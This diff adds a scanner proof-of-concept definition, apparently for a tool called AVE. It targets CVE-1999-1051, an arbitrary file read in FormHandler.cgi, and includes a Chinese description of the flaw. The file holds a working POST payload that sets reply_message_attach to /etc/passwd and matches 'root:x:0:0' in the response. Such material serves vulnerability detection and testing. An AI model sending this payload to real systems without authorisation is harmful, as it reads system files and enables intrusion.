@@ -1,0 +1,33 @@
+[info]
+author = "ave"
+description = "Matt Wright FormHandler.cgi 在默认配置下允许将任意目录用作附件目录，且仅限制 /etc/ 目录访问。攻击者可向 reply_message_attach 参数提交目标文件路径，使脚本将服务器上的任意文件内容作为附件返回。本 PoC 通过构造表单请求指向 /etc/passwd，检测响应中是否包含该文件内容以验证漏洞存在。"
+id = "POC-AVE-1999-0903"
+name = "CVE-1999-1051 FormHandler.cgi 任意文件读取 PoC"
+severity = "medium"
+tags = ["ave-1999-0903"]
+vuln_id = [
+    "CVE-1999-1051",
+    "AVE-1999-0903",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/cgi-bin/FormHandler.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "reply_message_attach=/etc/passwd&recipient=test@example.com&email=test@example.com&realname=test&subject=test&message=test"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["root:x:0:0"]
